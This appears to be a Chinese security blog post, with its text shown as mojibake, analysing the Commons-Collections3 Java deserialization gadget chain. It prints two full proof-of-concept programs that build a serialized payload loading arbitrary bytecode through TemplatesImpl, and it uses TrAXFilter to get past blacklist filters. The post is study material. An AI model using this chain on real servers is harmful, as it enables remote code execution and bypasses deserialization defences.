<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>Commons-Collections3 | he11çš„å†œåœº</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">



<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="åˆ©ç”¨ç‰ˆæœ¬ï¼š
CommonsCollections 3.1 - 3.2.1
jdk 8u71 ç‰ˆæœ¬ä¹‹å‰

2015å¹´åˆï¼Œ@frohoffå’Œ@geblå‘å¸ƒäº†Talkã€ŠMarshalling Pickles: how deserializing ..." />
    <meta name="keywords" content="cc,java,ååºåˆ—åŒ–" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://dydydy123.github.io">
        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
        <h1 class="site-title">he11çš„å†œåœº</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      ganma~~~~~~~~~~
    </div>
    <div class="site-footer">
       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">Commons-Collections3</h2>
            <div class="post-date">2022-11-17</div>
            
              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/commons-collections3.jpg')">
              </div>
            
            <div class="post-content" v-pre>
              <p><strong>åˆ©ç”¨ç‰ˆæœ¬ï¼š</strong><br>
CommonsCollections 3.1 - 3.2.1<br>
jdk 8u71 ç‰ˆæœ¬ä¹‹å‰</p>
<!-- more -->
<p>2015å¹´åˆï¼Œ@frohoffå’Œ@geblå‘å¸ƒäº†Talkã€ŠMarshalling Pickles: how deserializing objects will ruinyour dayã€‹ï¼Œä»¥åŠJavaååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ysoserialï¼Œéšåå¼•çˆ†äº†å®‰å…¨ç•Œã€‚å¼€å‘è€…ä»¬è‡ªç„¶ä¼šå»æ‰¾å¯»ä¸€ç§å®‰å…¨çš„è¿‡æ»¤æ–¹æ³•ï¼Œäºæ˜¯ç±»ä¼¼SerialKillerè¿™æ ·çš„å·¥å…·éšä¹‹è¯ç”Ÿã€‚</p>
<p>SerialKilleræ˜¯ä¸€ä¸ªJavaååºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡é»‘åå•ä¸ç™½åå•çš„æ–¹å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„<br>
ç±»ã€‚åœ¨å…¶å‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç»™å‡ºäº†æœ€åˆçš„é»‘åå•ï¼š<br>
<img src="https://dydydy123.github.io/post-images/1668745432329.png" alt="" loading="lazy"><br>
ä¸Šé¢æ˜¯ä»pç‰›é‚£é‡ŒæŠ çš„å›¾å’Œè¯ã€‚ğŸ˜<br>
Commons-Collections3çš„ç›®çš„ä¾¿æ˜¯ç»•è¿‡ä¸€äº›é™åˆ¶ï¼ˆæ¯”å¦‚InvokerTransformerï¼‰ï¼ŒCommons-Collections3ä½¿ç”¨ <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>æ¥æ›¿ä»£<code>InvokerTransformer</code>ä¸­çš„ä»»æ„æ–¹æ³•æ‰§è¡Œï¼ˆæ­¤å¤„ä¸º<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code>ï¼‰TrAXFilterçš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº† <code>(TransformerImpl) templates.newTransformer() </code>ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å…å»äº†ä½¿ç”¨<br>
<code>InvokerTransformer</code>è°ƒç”¨ <code>newTransformer()</code> æ–¹æ³•ã€‚ä»è€Œç»•è¿‡<code>InvokerTransformer</code>çš„é™åˆ¶ã€‚</p>
<p><img src="https://dydydy123.github.io/post-images/1668750008484.png" alt="" loading="lazy"><br>
å¯ä»¥çœ‹åˆ°Commons-Collections3å…¶å®å°±æ˜¯åœ¨Commons-Collections1çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ç»•è¿‡ã€‚åœ¨ç»“åˆTemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç å®ç°ä»£ç æ‰§è¡Œã€‚</p>
<p><strong>ç›¸å…³ç±»</strong><br>
<strong>TrAXFilter</strong><br>
<code>TrAXFilter#TrAXFilter</code></p>
<pre><code>public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }
</code></pre>
<p><strong>InstantiateTransformer</strong><br>
Commons Collections æä¾›äº† <code>InstantiateTransformerç±»</code> å¯é€šè¿‡åå°„åˆ›å»ºç±»çš„å®ä¾‹ï¼Œåœ¨ <code>InstantiateTransformer#transform()</code>æ–¹æ³•æ¥æ”¶ä¸€ä¸ª Class ç±»å‹çš„å¯¹è±¡ï¼ˆæ­¤å¤„ä¸º<code>TrAXFilter.class</code>ï¼‰ï¼Œé€šè¿‡ <code>getConstructor</code> è·å–æ„é€ æ–¹æ³•ï¼Œå¹¶é€šè¿‡ <code>newInstance</code> åˆ›å»ºç±»å®ä¾‹</p>
<p><code>InstantiateTransformer#InstantiateTransformer</code></p>
<pre><code>public InstantiateTransformer(Class[] paramTypes, Object[] args) {
        super();
        iParamTypes = paramTypes;
        iArgs = args;
    }
</code></pre>
<p><code>InstantiateTransformer#transform</code></p>
<pre><code>public Object transform(Object input) {
        try {
            if (input instanceof Class == false) {
                throw new FunctorException(
                    &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;
                        + (input == null ? &quot;null object&quot; : input.getClass().getName()));
            }
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            return con.newInstance(iArgs);

        } catch (NoSuchMethodException ex) {
            throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);
        } catch (InstantiationException ex) {
            throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);
        } catch (IllegalAccessException ex) {
            throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);
        } catch (InvocationTargetException ex) {
            throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);
        }
    }
</code></pre>
<p><code> Constructor con = ((Class) input).getConstructor(iParamTypes);</code><br>
<code> return con.newInstance(iArgs);</code><br>
iParamTypesï¼ˆTrAXFilteræ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹.classï¼‰ä¸iArgsï¼ˆå‚æ•°å€¼ï¼‰å‡å¯æ§ï¼Œåˆå§‹åŒ–æ—¶ä¼ å…¥ã€‚<br>
inputä¸º<code>TrAXFilter.class</code>ã€‚</p>
<p><strong>Commons-Collections1ä¸TemplatesImplç›¸ç»“åˆçš„ä»£ç æœªè¿›è¡Œç»•è¿‡çš„</strong></p>
<pre><code>package Cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Cc3 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\class\\&quot;,&quot;Temp.class&quot;));
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, &quot;_name&quot;, &quot;notnull&quot;);
        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(obj),
                new InvokerTransformer(&quot;newTransformer&quot;,null,null),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();

        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
//        lazyMap.get(null);

//        é€šè¿‡åå°„è·å–AnnotationInvocationHandler
        Class&lt;?&gt; cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; Constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        Constructor.setAccessible(true);
        // åˆ›å»ºæºå¸¦ç€ LazyMap çš„ AnnotationInvocationHandler å®ä¾‹
        InvocationHandler handler = (InvocationHandler)Constructor.newInstance(Target.class, lazyMap);
        // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹
        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), handler);
        // ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler
        handler = (InvocationHandler)Constructor.newInstance(Target.class, lazyMapProxy);

//        serialize(handler);
        unserialize(&quot;ser.bin&quot;);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        o.writeObject(obj);
    }
    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
        return o.readObject();
    }
    public static void setFieldValue(Object obj,String name,Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}

</code></pre>
<p>ä½¿ç”¨<code>TrAXFilter</code>ç±»ç»•è¿‡é»‘åå•ï¼Œå› ä¸ºè¯¥ç±»æœªç»§æ‰¿Serializableæ¥å£æ— æ³•ååºåˆ—åŒ–ï¼Œæ‰€ä»¥é€šè¿‡åå°„è·å–è¯¥ç±»ï¼Œå¯ä½¿ç”¨<code>InstantiateTransformer</code>ç±»ã€‚</p>
<pre><code>package Cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Cc6 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\class\\&quot;,&quot;Temp.class&quot;));
        Templates obj = new TemplatesImpl();
        setFieldValue(obj, &quot;_name&quot;, &quot;notnull&quot;);
        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();

        Map lazyMap = LazyMap.decorate(map,chainedTransformer);

//        é€šè¿‡åå°„è·å–AnnotationInvocationHandler
        Class&lt;?&gt; cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; Constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        Constructor.setAccessible(true);
        // åˆ›å»ºæºå¸¦ç€ LazyMap çš„ AnnotationInvocationHandler å®ä¾‹
        InvocationHandler handler = (InvocationHandler)Constructor.newInstance(Target.class, lazyMap);
        // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹
        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), handler);
        // ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler
        handler = (InvocationHandler)Constructor.newInstance(Target.class, lazyMapProxy);

        serialize(handler);
        unserialize(&quot;ser.bin&quot;);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        o.writeObject(obj);
    }
    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
        return o.readObject();
    }
    public static void setFieldValue(Object obj,String name,Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}

</code></pre>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://dydydy123.github.io/tag/H2OnWZra8/" class="tag">
                    cc
                  </a>
                
                  <a href="https://dydydy123.github.io/tag/-DwzpURo7/" class="tag">
                    java
                  </a>
                
                  <a href="https://dydydy123.github.io/tag/OtQMAvCGr3/" class="tag">
                    ååºåˆ—åŒ–
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://dydydy123.github.io/post/n/">
                  <h3 class="post-title">
                    Commons-Collections6
                  </h3>
                </a>
              </div>
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>





  </body>
</html>
